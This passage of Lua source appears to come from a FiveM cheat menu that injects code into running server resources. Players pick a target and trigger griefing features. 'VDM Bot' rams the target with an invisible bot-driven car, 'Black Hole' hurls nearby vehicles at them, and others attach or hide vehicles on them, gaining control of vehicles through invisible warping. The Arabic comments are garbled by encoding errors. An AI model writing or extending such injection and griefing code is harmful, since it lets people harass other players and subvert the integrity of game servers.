                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityAsMissionEntity(playerPed, false, false)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                        Citizen.Wait(100)
                                        TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                        Citizen.Wait(600)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasks(playerPed)
                                        SetEntityVisible(playerPed, true, false)
                                        Citizen.Wait(200)
                                       
                                        -- Ø¨Ø¯Ø¡ VDM Ø¨Ø¹Ø¯ Ø¹ÙˆØ¯Ø© Ø§Ù„Ù„Ø§Ø¹Ø¨
                                        if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then return end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                            for seat = 0, maxSeats do
                                                local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                                if ped ~= 0 and ped ~= playerPed then
                                                    SetPedCanBeDraggedOut(ped, false)
                                                    SetPedConfigFlag(ped, 32, true)
                                                    TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                                end
                                            end
                                           
                                            -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then
                                                if DoesEntityExist(botPed) then
                                                    DeleteEntity(botPed)
                                                end
                                                return
                                            end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- Ø­Ù„Ù‚Ø© VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end
                                end)
                            ]])
                            MachoMenuNotification("Vehicle", "Fallback VDM - Using occupied vehicle targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                        else
                            -- Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ Ø³ÙŠØ§Ø±Ø© - Ø¥Ù†Ø´Ø§Ø¡ Ø³ÙŠØ§Ø±Ø© Ø¬Ø¯ÙŠØ¯Ø©
                            local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
                                local mhash = GetHashKey(name)
                                RequestModel(mhash)
                                
                                local timeout = 0
                                while not HasModelLoaded(mhash) and timeout < 8000 do
                                    Citizen.Wait(100)
                                    timeout = timeout + 100
                                end
                                
                                if not HasModelLoaded(mhash) then
                                    return false
                                end
                                local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
                                local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
                                
                                local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
                                
                                if DoesEntityExist(vehicle) then
                                    SetVehicleOnGroundProperly(vehicle)
                                    SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
                                    SetModelAsNoLongerNeeded(mhash)
                                    SetEntityInvincible(vehicle, true)
                                    SetVehicleBodyHealth(vehicle, 50000.0)
                                    SetVehicleEngineHealth(vehicle, 50000.0)
                                    SetVehicleUndriveable(vehicle, false)
                                    NetworkRegisterEntityAsNetworked(vehicle)
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
                                    
                                    -- Ø¶Ù…Ø§Ù† Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ù…Ø±ÙƒØ¨Ø©
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    NetworkRequestControlOfEntity(vehicle)
                                    
                                    return vehicle
                                else
                                    SetModelAsNoLongerNeeded(mhash)
                                    return false
                                end
                            end
                            
                            -- Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…Ø³ØªØ«Ù†Ø§Ø©
                            local excludedVehicles = {
                                "stunt",
                                "avisa",
                                "marshall"
                            }
                            
                            -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ù†Ù…Ø§Ø°Ø¬ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø© ÙÙŠ Ø§Ù„Ù„Ø¹Ø¨Ø©
                            local vehicleModels = GetAllVehicleModels()
                            
                            -- ÙÙ„ØªØ±Ø© Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…Ø³ØªØ«Ù†Ø§Ø©
                            local filteredVehicles = {}
                            for i = 1, #vehicleModels do
                                local vehicleModel = vehicleModels[i]
                                local shouldInclude = true
                                for _, excludedName in ipairs(excludedVehicles) do
                                    if string.find(string.lower(vehicleModel), string.lower(excludedName)) then
                                        shouldInclude = false
                                        break
                                    end
                                end
                                if shouldInclude then
                                    table.insert(filteredVehicles, vehicleModel)
                                end
                            end
                            
                            -- Ø§Ø®ØªÙŠØ§Ø± Ø³ÙŠØ§Ø±Ø© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ©
                            local randomVehicle = filteredVehicles[math.random(1, #filteredVehicles)]
                            
                            -- Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ø¨Ø§Ù„Ù‚Ø±Ø¨ Ù…Ù† Ø§Ù„Ù‡Ø¯Ù
                            local spawnPos = targetPos + vector3(math.random(-10, 10), math.random(-10, 10), 2.0)
                            local spawnedVehicle = spawnVehicle("car", randomVehicle, {spawnPos.x, spawnPos.y, spawnPos.z}, math.random(1000, 9999), false)
                            
                            if spawnedVehicle then
                                -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙˆØ§Ø±Ø¨ Ø§Ù„Ø³Ø±ÙŠØ¹ Ù„Ù„Ø³ÙŠØ§Ø±Ø© Ø§Ù„Ù…ÙÙ†Ø´Ø£Ø©
                                SetEntityVisible(playerPed, false, false)
                                ClearPedTasksImmediately(playerPed)
                                TaskWarpPedIntoVehicle(playerPed, spawnedVehicle, -1)
                                ClearPedTasksImmediately(playerPed)
                                TaskLeaveVehicle(playerPed, spawnedVehicle, 0)
                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)
                                SetEntityVisible(playerPed, true, false)
                               
                                MachoInjectResource("any", [[
                                    vdmActive = true
                                    vdmBotPed = nil
                                    vdmVehicle = nil
                                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                                   
                                    Citizen.CreateThread(function()
                                        local targetVehicle = ]] .. spawnedVehicle .. [[
                                       
                                        if DoesEntityExist(targetVehicle) and vdmActive then
                                            vdmVehicle = targetVehicle
                                           
                                            NetworkRequestControlOfEntity(targetVehicle)
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                           
                                            -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- Ø­Ù„Ù‚Ø© VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end)
                                ]])
                                MachoMenuNotification("Vehicle", "Spawned new vehicle VDM - " .. randomVehicle .. " targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                            else
                                MachoMenuNotification("Error", "Failed to spawn vehicle for VDM")
                            end
                        end
                    end
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableVDM = false
        MachoInjectResource("any", [[
            vdmActive = false
        ]])
        MachoMenuNotification("Vehicle", "VDM Bot deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Black Hole", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    
                    Citizen.CreateThread(function()
                        while blackHoleActive do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø­Ø¯Ø¯ ÙÙ‚Ø·
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª ÙÙŠ Ù†Ø·Ø§Ù‚ 200 Ù…ØªØ±
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                                if distance < 400.0 and distance > 2.0 then -- ØªØ¬Ù†Ø¨ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù‚Ø±ÙŠØ¨Ø© Ø¬Ø¯Ø§Ù‹
                                            -- ÙØ­Øµ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - Ø¬Ø°Ø¨ Ø¹Ø§Ø¯ÙŠ
                                                local direction = targetPos - vehiclePos
                                                direction = direction / #direction
                                                local force = 80.0
                                                local velocity = direction * force
                                                SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                            else
                                                -- Ù…Ø§Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - ÙØ­Øµ Ø¥Ø°Ø§ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - ÙˆØ§Ø±Ø¨ Ø³Ø±ÙŠØ¹ Ø¬Ø¯Ø§Ù‹ Ø¨Ø¯ÙˆÙ† Ø£ÙŠ Ø§Ù†ØªØ¸Ø§Ø±
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- Ø§Ù„Ø¢Ù† Ø¬Ø°Ø¨ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                                    local direction = targetPos - vehiclePos
                                                    direction = direction / #direction
                                                    local force = 80.0
                                                    local velocity = direction * force
                                                    SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                                end
                                                -- Ø¥Ø°Ø§ ÙÙŠÙ‡Ø§ Ù‚Ø§Ø¦Ø¯ - ØªØ¬Ù†Ø¨Ù‡Ø§ (Ù…Ø§ÙÙŠ ÙƒÙˆØ¯)
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(100) -- ØªØ­Ø¯ÙŠØ« ÙƒÙ„ 100 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªØ£Ø«ÙŠØ± Ø³Ù„Ø³
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Attach Vehicles", 
    function()
        enableAttach = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    attachActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    attachedVehicles = {}
                    
                    Citizen.CreateThread(function()
                        local targetPed = GetPlayerPed(originalTargetPlayer)
                        -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø­Ø¯Ø¯ ÙÙ‚Ø·
                        if DoesEntityExist(targetPed) then
                            local targetPos = GetEntityCoords(targetPed)
                            
                            -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª ÙÙŠ Ù†Ø·Ø§Ù‚ 200 Ù…ØªØ±
                            local handle, vehicle = FindFirstVehicle()
                            local success
                            repeat
                                if DoesEntityExist(vehicle) then
                                    local vehiclePos = GetEntityCoords(vehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    if distance < 400.0 and distance > 2.0 then -- ØªØ¬Ù†Ø¨ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù‚Ø±ÙŠØ¨Ø© Ø¬Ø¯Ø§Ù‹
                                        -- ÙØ­Øµ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                        NetworkRequestControlOfEntity(vehicle)
                                        local hasControl = NetworkHasControlOfEntity(vehicle)
                                        
                                        if hasControl then
                                            -- Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - Ø¹Ù…Ù„ attach ÙÙŠ Ù†ÙØ³ Ù…ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ
                                            AttachEntityToEntity(
                                                vehicle, targetPed, 0,
                                                0.0, 0.0, 0.0, -- Ù†ÙØ³ Ù…ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø¨Ø§Ù„Ø¶Ø¨Ø·
                                                0.0, 0.0, 0.0,
                                                false, false, true, false, 2, true
                                            )
                                            table.insert(attachedVehicles, vehicle)
                                        else
                                            -- Ù…Ø§Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - ÙØ­Øµ Ø¥Ø°Ø§ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
                                            local isVehicleEmpty = true
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                            
                                            for seat = -1, maxSeats do
                                                local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                if pedInSeat ~= 0 then
                                                    local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                    if playerId ~= -1 then
                                                        isVehicleEmpty = false
                                                        break
                                                    end
                                                end
                                            end
                                            
                                            if isVehicleEmpty then
                                                -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - ÙˆØ§Ø±Ø¨ Ø³Ø±ÙŠØ¹ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©
                                                local playerPed = PlayerPedId()
                                                local originalPos = GetEntityCoords(playerPed)
                                                local originalHeading = GetEntityHeading(playerPed)
                                                
                                                SetEntityVisible(playerPed, false, false)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskLeaveVehicle(playerPed, vehicle, 0)
                                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                SetEntityHeading(playerPed, originalHeading)
                                                SetEntityVisible(playerPed, true, false)
                                                
                                                -- Ø§Ù„Ø¢Ù† Ø¹Ù…Ù„ attach Ù„Ù„Ø³ÙŠØ§Ø±Ø© ÙÙŠ Ù†ÙØ³ Ù…ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ
                                                AttachEntityToEntity(
                                                    vehicle, targetPed, 0,
                                                    0.0, 0.0, 0.0, -- Ù†ÙØ³ Ù…ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø¨Ø§Ù„Ø¶Ø¨Ø·
                                                    0.0, 0.0, 0.0,
                                                    false, false, true, false, 2, true
                                                )
                                                table.insert(attachedVehicles, vehicle)
                                            end
                                            -- Ø¥Ø°Ø§ ÙÙŠÙ‡Ø§ Ù‚Ø§Ø¦Ø¯ - ØªØ¬Ù†Ø¨Ù‡Ø§ (Ù…Ø§ÙÙŠ ÙƒÙˆØ¯)
                                        end
                                    end
                                end
                                success, vehicle = FindNextVehicle(handle)
                            until not success
                            EndFindVehicle(handle)
                        end
                    end)
                ]])
                MachoMenuNotification("Attach", "Vehicle attach activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableAttach = false
        MachoInjectResource("any", [[
            attachActive = false
            -- ÙØµÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…Ø±ÙÙ‚Ø©
            for i, vehicle in ipairs(attachedVehicles) do
                if DoesEntityExist(vehicle) then
                    DetachEntity(vehicle, true, true)
                end
            end
            attachedVehicles = {}
        ]])
        MachoMenuNotification("Attach", "Vehicle attach deactivated - All vehicles detached")
    end
)
MachoMenuCheckbox(PlayerSection, "Annoy Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø³ÙŠØ§Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£ÙˆÙ„ Ø³ÙŠØ§Ø±Ø© Ù…Ù†Ø§Ø³Ø¨Ø© ÙÙŠ Ù†Ø·Ø§Ù‚ 400 Ù…ØªØ±
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- ÙØ­Øµ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - Ø§Ø³ØªØ®Ø¯Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- Ù…Ø§Ø¹Ù†Ø¯Ù‡ ØµÙ„Ø§Ø­ÙŠØ© - ÙØ­Øµ Ø¥Ø°Ø§ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - ÙˆØ§Ø±Ø¨ Ø³Ø±ÙŠØ¹ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ…
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- Ø§Ù†ØªØ¸Ø§Ø± Ø«Ø§Ù†ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„Ø¨Ø­Ø« Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
                        end
                        
                        -- Ø¥Ø°Ø§ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø³ÙŠØ§Ø±Ø©ØŒ Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù€ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø®ÙÙŠØ©
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- Ø¬Ø¹Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØºÙŠØ± Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„ØªØ®Ø±ÙŠØ¨
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged ØºÙŠØ± Ù…ØªÙˆÙØ± ÙÙŠ FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- Ù…Ù†Ø¹ Ø§Ù„ØªÙØ¬ÙŠØ± ÙˆØ§Ù„Ø§Ù†ÙØ¬Ø§Ø±
